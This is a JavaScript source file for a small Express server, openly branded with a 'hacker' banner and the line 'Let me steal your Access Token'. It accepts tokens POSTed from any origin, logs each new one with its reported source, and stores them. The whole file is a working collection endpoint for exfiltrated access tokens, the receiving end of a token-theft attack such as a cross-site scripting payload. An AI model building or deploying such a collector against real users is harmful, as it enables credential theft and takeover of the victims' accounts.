/**
 * MIT License
 *
 * Copyright (c) 2022 Jerad Rutnam (www.jeradrutnam.com)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 **/

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
let receivedAccessTokens = [];

app.use(bodyParser.json());
app.use(cors());

/**
 * Handles post request comes to the path /access-token to print the access token in the console when receives
 */
app.post("/access-token", cors({ origin: "*" }), (req, res) => {

    if (req.body.accessToken && !receivedAccessTokens.includes(req.body.accessToken)) {
        console.log("\n")
        console.log("\x1b[33m%s\x1b[0m", "Caught New Access Token From:", req.body.source || "");
        console.log("\x1b[32m%s\x1b[0m", req.body.accessToken);

        receivedAccessTokens.push(req.body.accessToken);

        res.status(200).send();
    }

    res.status(400).send();
});

app.listen(5000, () => {
    console.log(
        "   _                _                 \n" +
        "  | |              | |                \n" +
        "  | |__   __ _  ___| | _____ _ __     \n" +
        "  | '_ \\ / _` |/ __| |/ / _ \\ '__|  \n" +
        "  | | | | (_| | (__|   <  __/ |       \n" +
        "  |_| |_|\\__,_|\\___|_|\\_\\___|_|     "
    );
    console.log("----------------------------------");
    console.log("  Let me steal your Access Token  ");
    console.log("----------------------------------\n");
    console.log("Server running at port 5000.\n");
});